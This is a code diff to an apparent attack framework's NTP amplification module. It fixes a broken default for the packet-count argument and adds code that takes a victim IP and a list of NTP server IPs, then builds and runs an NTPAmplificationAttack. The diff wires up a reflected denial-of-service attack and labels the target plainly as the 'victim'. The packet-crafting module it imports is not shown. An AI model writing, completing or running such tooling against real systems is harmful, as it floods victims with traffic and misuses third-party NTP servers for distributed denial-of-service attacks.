@@ -18,7 +18,7 @@ class NtpAmplification(AttackBase):
     def add_arguments(self, parser: argparse.ArgumentParser) -> None:
         parser.add_argument('--victim', required=True, help='Victim IP address')
         parser.add_argument('--ntp-servers', required=True, help='NTP server IPs (comma-separated)')
-        parser.add_argument('--count', type=int, , help='Number of packets (default: 100)')
+        parser.add_argument('--count', type=int, default=100, help='Number of packets (default: 100)')
         parser.add_argument('--verbose', action='store_true', help='Verbose output')
 
     def validate(self, args: argparse.Namespace) -> bool:
@@ -32,7 +32,18 @@ class NtpAmplification(AttackBase):
         try:
             import ntp_amplification as attack_module
             logger.info(f"Running ntp-amplification attack")
-            # Attack execution handled by module
+
+            # Parse NTP servers list
+            ntp_servers = [s.strip() for s in args.ntp_servers.split(',')]
+
+            # Create and execute attack
+            attack = attack_module.NTPAmplificationAttack(
+                args.victim,
+                ntp_servers,
+                args.count,
+                args.verbose
+            )
+            attack.execute()
         except Exception as e:
             logger.error(f"Attack failed: {e}")
             raise
